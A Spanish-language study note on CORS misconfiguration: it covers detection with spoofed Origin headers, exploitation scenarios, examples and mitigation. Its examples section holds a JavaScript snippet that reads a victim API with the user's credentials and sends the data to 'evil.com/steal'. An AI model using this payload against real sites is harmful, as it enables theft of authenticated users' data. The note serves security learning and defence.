
---
Tags: #web #cors #cabeceras #headers #robo

---
## 📖 Definición

**CORS** es un mecanismo de seguridad implementado en navegadores que controla si un dominio (origen) puede realizar solicitudes HTTP a otro dominio distinto.  
Un **origen** está compuesto por:

`<protocolo>://<dominio>:<puerto>`

👉 Vulnerabilidades de CORS aparecen cuando el servidor está mal configurado y **permite que orígenes no confiables realicen peticiones autenticadas** (enviando cookies, tokens, etc.).

Ejemplo inseguro en cabeceras de respuesta:

`Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true`

➡ Esto permite que **cualquier página maliciosa** haga peticiones al servidor como si fuera el usuario legítimo.

---

## 🔎 Métodos de Detección

|Método|Descripción|Herramienta|
|---|---|---|
|**Revisar cabeceras HTTP**|Buscar `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`.|Burp Suite, curl|
|**Probar orígenes arbitrarios**|Enviar solicitudes con `Origin: https://evil.com` y observar si se refleja.|Burp Suite Repeater|
|**Analizar respuestas**|Ver si `Access-Control-Allow-Origin` refleja dinámicamente el `Origin` enviado.|Proxy HTTP|
|**Pruebas con credenciales**|Ver si `Access-Control-Allow-Credentials: true` está habilitado.|Navegador, fetch()|

---

## 💥 Métodos de Explotación

|Escenario|Configuración insegura|Impacto|
|---|---|---|
|**Wildcard con credenciales**|`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`|Cualquier dominio puede robar datos del usuario autenticado|
|**Reflejo de origen**|Servidor devuelve el mismo `Origin` enviado por el atacante|Bypass de restricción de orígenes|
|**Subdominios inseguros**|`Access-Control-Allow-Origin: *.victima.com`|Un atacante con control de subdominio puede explotar CORS|
|**Cabeceras expuestas**|`Access-Control-Expose-Headers` incluye cabeceras sensibles|Robo de tokens o datos confidenciales|

---

## 🛠 Ejemplos prácticos

### 1. Detección con `curl`

`curl -H "Origin: https://evil.com" -I https://victima.com/api/user`

Respuesta vulnerable:

`Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true`

---

### 2. Explotación con JavaScript (robo de datos)
```js
<script> 
	fetch("https://victima.com/api/user", {credentials: "include" }) .then(response => response.text()) .then(data => {     fetch("https://evil.com/steal?data=" + btoa(data)); }); 
</script>
```

➡ El navegador enviará cookies/tokens del usuario hacia `victima.com` y luego el atacante roba la respuesta.

---

### 3. Caso con subdominios

Si la cabecera es:

`Access-Control-Allow-Origin: *.victima.com`

➡ El atacante controla `evil.victima.com` → puede explotar CORS como origen permitido.

---

## 📌 Consecuencias comunes

- Robo de información sensible (datos personales, tokens de sesión, claves API).
    
- Ejecución de acciones en nombre del usuario autenticado.
    
- Compromiso completo de cuentas si la API expone datos críticos.
    

---

## 🧪 Técnicas de Apoyo

- Probar con distintos `Origin` falsos:
    
    - `https://evil.com`
        
    - `https://victima.com.evil.com`
        
    - `null` (algunos servidores permiten `Origin: null`).
        
- Revisar cabeceras adicionales:
    
    - `Access-Control-Allow-Methods`
        
    - `Access-Control-Expose-Headers`
        
- Usar Burp Suite __CORS_ Plugin_* para automatizar pruebas.
    

---

## 🛡 Mitigación

- Nunca usar `Access-Control-Allow-Origin: *` junto con `Allow-Credentials: true`.
    
- Especificar **orígenes de confianza explícitos** en backend.
    
- Validar orígenes en **lista blanca estricta**.
    
- Evitar reflejar dinámicamente el `Origin` recibido.
    
- Limitar métodos permitidos (`GET, POST`) y cabeceras expuestas.
    

---

## 🎯 Resumen

- **Qué es:** CORS controla qué orígenes externos pueden interactuar con el servidor.
    
- **Vulnerabilidad:** ocurre cuando configuraciones laxas permiten a atacantes abusar de autenticación del usuario.
    
- **Cómo detectarlo:** probando cabeceras `Origin` personalizadas.
    
- **Cómo explotarlo:** usando JavaScript malicioso para leer datos de APIs autenticadas.
    
- **Impacto:** robo de datos sensibles, secuestro de cuentas.
    
- **Mitigación:** validación estricta de orígenes y cabeceras seguras.